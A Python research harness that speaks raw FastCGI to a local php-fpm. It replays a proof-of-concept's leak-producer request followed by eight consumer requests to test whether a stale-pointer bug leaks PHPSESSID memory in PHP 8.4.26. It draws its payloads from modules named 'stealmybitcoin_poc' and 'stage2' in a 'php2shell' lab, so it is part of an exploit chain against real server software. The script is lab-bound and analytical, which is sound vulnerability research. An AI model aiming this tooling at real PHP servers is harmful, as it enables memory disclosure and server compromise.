#!/usr/bin/env python3
"""Replay the PoC's 1 producer + 8 consumer sequence over FastCGI to php-fpm.

Why this exists
---------------
php -S cannot pipeline (step5_pipeline.py: a single sendall of 9 requests yields
zero bytes), so the reference PoC's send pattern cannot be replayed against the
CLI server. php-fpm gives the same property the reference lab got from nginx's
keep-alive upstream: with pm.max_children=1 every request lands on the same
child, so the poisoned worker is guaranteed to serve all eight consumers.

Critically this runs against the UNINSTRUMENTED musl build
(rt-alpine/php-8.4.26/rootfs, the docker image extraction). Every one of the
192 pooled runs in docs/ANALYSIS.md used the instrumented source build. This is
therefore the differential experiment 10.6 asks for: if the stale pointer shows
up here but not in the instrumented build, the INSTR-A0 probes are the culprit.

Observables without probes: the Set-Cookie PHPSESSID value on the wire. Healthy
= 32 bytes of hex. A leak = 16 bytes or a garbage length.

Usage: ./step5_fpm.py [--port 19426] [--reps 2]
"""
import io
import os
import re
import socket
import struct
import sys
import time

sys.path[:0] = ["/opt/data/php2shell-lab", "/opt/data/lab-scratch",
                "/tmp/StealMyBitcoin-PoC"]
import stealmybitcoin_poc as P            # noqa: E402
import stage2 as S2                       # noqa: E402

FCGI_BEGIN_REQUEST = 1
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_RESPONDER = 1
FCGI_KEEP_CONN = 0
CHUNK = 65000                    # FCGI content length field is 16-bit
WWW = "/opt/data/php2shell-lab/www"
SCRIPT = WWW + "/sessprobe.php"
EVID = "/opt/data/lab-scratch/fpm-logs"
A0 = re.compile(rb"PHPSESSID=([^;\r\n]*)")


def _rec(rtype, content, req_id=1):
    pad = (-len(content)) % 8
    return (struct.pack("!BBHHBB", 1, rtype, req_id, len(content), pad, 0)
            + content + b"\x00" * pad)


def _nv(pairs):
    out = b""
    for k, v in pairs:
        k = k.encode() if isinstance(k, str) else k
        v = v.encode() if isinstance(v, str) else v
        for part in (k, v):
            out += (bytes([len(part)]) if len(part) < 128
                    else struct.pack("!I", len(part) | 0x80000000))
        out += k + v
    return out


def cookie_header(n=1001):
    alpha = "0123456789abcdefghijklmnopqrstuvwxyz"
    return "".join(alpha[(i // 36) % 36] + alpha[i % 36] + "=;"
                   for i in range(n))


def request(port, payload, timeout=120.0, script=SCRIPT):
    params = [("GATEWAY_INTERFACE", "CGI/1.1"),
              ("SERVER_SOFTWARE", "step5_fpm"),
              ("SERVER_PROTOCOL", "HTTP/1.1"),
              ("REQUEST_METHOD", "POST"),
              ("REQUEST_URI", "/sessprobe.php"),
              ("SCRIPT_NAME", "/sessprobe.php"),
              ("SCRIPT_FILENAME", script),
              ("DOCUMENT_ROOT", WWW),
              ("REMOTE_ADDR", "127.0.0.1"),
              ("SERVER_NAME", "127.0.0.1"),
              ("SERVER_PORT", str(port)),
              ("CONTENT_TYPE", "multipart/form-data; boundary=" +
               S2.BOUNDARY.decode()),
              ("CONTENT_LENGTH", str(len(payload))),
              ("HTTP_COOKIE", cookie_header(S2.COOKIE_PAIRS))]
    buf = (_rec(FCGI_BEGIN_REQUEST,
                struct.pack("!HB5x", FCGI_RESPONDER, FCGI_KEEP_CONN))
           + _rec(FCGI_PARAMS, _nv(params))
           + _rec(FCGI_PARAMS, b""))
    for off in range(0, len(payload), CHUNK):
        buf += _rec(FCGI_STDIN, payload[off:off + CHUNK])
    buf += _rec(FCGI_STDIN, b"")

    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.sendall(buf)
    out = b""
    while True:
        hdr = s.recv(8)
        if len(hdr) < 8:
            break
        _ver, rtype, _rid, clen, pad, _r = struct.unpack("!BBHHBB", hdr)
        content = b""
        while len(content) < clen:
            piece = s.recv(clen - len(content))
            if not piece:
                break
            content += piece
        if pad:
            s.recv(pad)
        if rtype in (FCGI_STDOUT, FCGI_STDERR):
            out += content
        elif rtype == FCGI_END_REQUEST:
            break
    s.close()
    return out


def probe_of(raw):
    """Read SID_LEN/SID_HEX printed by sessprobe.php."""
    m = re.search(rb"SID_LEN=(\d+)", raw)
    n = int(m.group(1)) if m else None
    h = re.search(rb"SID_HEX=([0-9a-f]*)", raw)
    return n, (h.group(1).decode() if h else None)


def sid_of(raw):
    head = raw.split(b"\r\n\r\n", 1)[0]
    m = A0.search(head)
    return m.group(1) if m else None


def main():
    port, reps = 19426, 2
    if "--port" in sys.argv:
        port = int(sys.argv[sys.argv.index("--port") + 1])
    if "--reps" in sys.argv:
        reps = int(sys.argv[sys.argv.index("--reps") + 1])
    os.makedirs(EVID, exist_ok=True)
    stage = P.STAGES["code"]
    prod = P.leak_producer(stage.producer)
    cons = stage.build_consumer()
    print("fpm replay: 1 producer (%d B) + %d consumers (%d B), port %d"
          % (len(prod), P.CONSUMERS, len(cons), port))
    for rep in range(reps):
        t0 = time.time()
        raw = request(port, prod)
        head = raw.split(b"\r\n\r\n", 1)[0]
        body = raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else b""
        flags = []
        for tag, needle in (("OOM", b"Allowed memory size"),
                            ("HDRSENT", b"Session cookie cannot be sent"),
                            ("INPUTVARS", b"Input variables exceeded"),
                            ("APP_REACHED", b"REACHED_APP")):
            if needle in raw:
                flags.append(tag)
        print("\n== rep %d producer -> %d B  flags=%s  %dms" % (
            rep, len(raw), ",".join(flags) or "-", (time.time() - t0) * 1000))
        n, hx = probe_of(raw)
        print("   producer SID_LEN=%s SID_HEX=%s Set-Cookie=%r" % (
            n, (hx[:80] if hx else None), sid_of(raw)))
        for i in range(P.CONSUMERS):
            t = time.time()
            r = request(port, cons)
            sid = sid_of(r)
            tag = []
            for name, needle in (("OOM", b"Allowed memory size"),
                                 ("HDRSENT", b"Session cookie cannot be sent"),
                                 ("APP_REACHED", b"REACHED_APP")):
                if needle in r:
                    tag.append(name)
            n, hx = probe_of(r)
            print("   consumer[%d] SID_LEN=%-5s SID_HEX=%s flags=%-12s %dms" % (
                i + 1, n, (hx[:80] + "..." if hx and len(hx) > 80 else hx),
                ",".join(tag) or "-", (time.time() - t) * 1000))
            with open(os.path.join(EVID, "rep%d-c%d.bin" % (rep, i + 1)), "wb") as fh:
                fh.write(r)
        with open(os.path.join(EVID, "rep%d-producer.bin" % rep), "wb") as fh:
            fh.write(raw)
    return 0


if __name__ == "__main__":
    sys.exit(main())
